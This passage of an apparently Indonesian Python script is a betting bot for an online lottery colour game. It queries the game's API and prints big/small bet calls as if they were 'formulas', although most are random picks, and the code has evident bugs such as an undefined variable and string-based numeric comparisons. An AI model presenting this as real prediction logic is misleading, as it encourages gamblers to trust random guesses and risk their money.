    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{GRY}┃{GRY}    {LT}    {GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BB7/9  {L} {N}{ BO}{WW1}  {L} {GRY}┃   {PT}-{secs:02d}  {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX14K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{GRY}┃{GRY}    {LT}    {GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KK2/3  {L} {N}{ BO}{WW1}  {L} {GRY}┃   {PT}-{secs:02d}  {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
       

       
			
def auto_besarX1 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			cs = ['rumusX1()','rumusX2()','rumusX4()','rumusX5()','rumusX6()','rumusX7()','rumusX8()','rumusX9()','rumusX10()']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}•{taruhanbesarX1()}')


def auto_kecilX1 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			cs = ['rumusX1()','rumusX2','rumusX4','rumusX5','rumusX6','rumusX7','rumusX8','rumusX9','rumusX10']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}{taruhankecilX1()}')
			
def taruhankecilX1 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX1K()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX2()
			elif f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX2()
			 
def taruhanbesarX1 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX1B()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX2()
			elif f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX2()
			 
			 
def auto_besarX2 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX2()}')


def auto_kecilX2 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX2()}')
			
def taruhankecilX2 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX2K()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX3()
			elif f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX3()
			 
def taruhanbesarX2 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX2B()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX3()
			elif f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX3()
			 
def auto_besarX3 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			cs = ['rumusX1()','rumusX2()','rumusX4()','rumusX5()','rumusX6()','rumusX7()','rumusX8()','rumusX9()','rumusX10()']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}•{taruhanbesarX3()}')


def auto_kecilX3 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			cs = ['rumusX1()','rumusX2','rumusX4','rumusX5','rumusX6','rumusX7','rumusX8','rumusX9','rumusX10']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}{taruhankecilX3()}')
			
def taruhankecilX3 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX3K()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX4()
			elif f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX4()
			 
def taruhanbesarX3 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX3B()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX4()
			elif f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX4()
			 
def auto_besarX4 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX4()}')


def auto_kecilX4 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX4()}')
			
def taruhankecilX4 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX4K()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX1()
			elif f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("KECIL LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX1()
			 
def taruhanbesarX4 ():
			data = {
			'typeid' : '1',
			'pageno' : '1',
			'language' : 'id'
			}
			gameissue()
			countdownTimerX4B()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			oo = ['1','2','3','4','5','6','7','8','9']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			session = requests.Session()
			a = response_GetNoaverageEmerdList()
			b = json.loads(a.text)
			c = b.get('data')
			d = c.get('list')
			e = d[0].get('issueNumber')
			ff = d[0].get('number')
			with open("Num.txt", 'w') as g:
			    g.write(ff)
			    g.close()
			ee = open("Num.txt", 'r')
			f = ee.read()
			if f > '4':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} BESAR {L}{L}{GRY}┃ {WW}  WINN  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR WIN\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX1()
			elif f < '5':
			 print(f'{G}{GRY}┃*{Y}{jj}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃{PT}{CY} KECIL {L}{L}{GRY}┃ {H}  LOSE  {L} {GRY}┃')
			 with open("winlose.txt",'a') as g:
			  g.write("BESAR LOSE\n")
			  g.close()
			  print(GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
			 rumusX1()
			 
			 
def rumusRNG3 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = session.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', data = data)
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('gameslist')
      e1 = d[0].get('Number')
      e5 = d[4].get('Number')
      e6 = d[9].get('IssueNumber')
      e10 = d[9].get('Number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['3','1','8','0','4','5','10','9','2','7','6']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = (f"int(j1)+int({v1})")
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{v1}")
      if res == '0':
       rumusX2()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX6()
      elif res == '3':
       rumusX5()
      elif res == '4':
       rumusX8()
      elif res == '5':
       rumusX9()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX7()
      elif res == '9':
       rumusX4()
      elif res == '10':
       rumusX1()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX8()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
			 
def rumusRNG2 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = session.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', data = data)
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('gameslist')
      e1 = d[0].get('Number')
      e5 = d[4].get('Number')
      e6 = d[9].get('IssueNumber')
      e10 = d[9].get('Number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = (f"int(j1)+int({v1})")
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{v1}")
      if res == '0':
       rumusX7()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX6()
      elif res == '3':
       rumusX8()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX9()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX2()
      elif res == '9':
       rumusX4()
      elif res == '10':
       rumusX1()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX8()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
			 
def rumusRNG1 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = session.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', data = data)
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('gameslist')
      e1 = d[0].get('Number')
      e5 = d[4].get('Number')
      e6 = d[9].get('IssueNumber')
      e10 = d[9].get('Number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{Xt}")
      if res == '0':
       rumusX8()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX4()
      elif res == '3':
       rumusX7()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX1()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX2()
      elif res == '9':
       rumusX6()
      elif res == '10':
       rumusX9()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX7()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
def rumusX0 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = session.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', data = data)
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('gameslist')
      e1 = d[0].get('Number')
      e5 = d[4].get('Number')
      e6 = d[9].get('IssueNumber')
      e10 = d[9].get('Number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{Xt}")
      if res == '0':
       rumusX1()
      elif res == '1':
       rumusX2()
      elif res == '2':
       rumusX3()
      elif res == '3':
       rumusX4()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX6()
      elif res == '6':
       rumusX7()
      elif res == '7':
       rumusX8()
      elif res == '8':
       rumusX9()
      elif res == '9':
       rumusX10()
      elif res == '10':
       rumusX11()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX7()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			
def rumusX1 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX1()
      elif res == '1':
       auto_kecilX1()
      elif res == '2':
       auto_kecilX1()
      elif res == '3':
       auto_kecilX1()
      elif res == '4':
       auto_kecilX1()
      elif res == '5':
       auto_kecilX1()
      elif res == '6':
       auto_kecilX1()
      elif res == '7':
       auto_kecilX1()
      elif res == '8':
       auto_kecilX1()
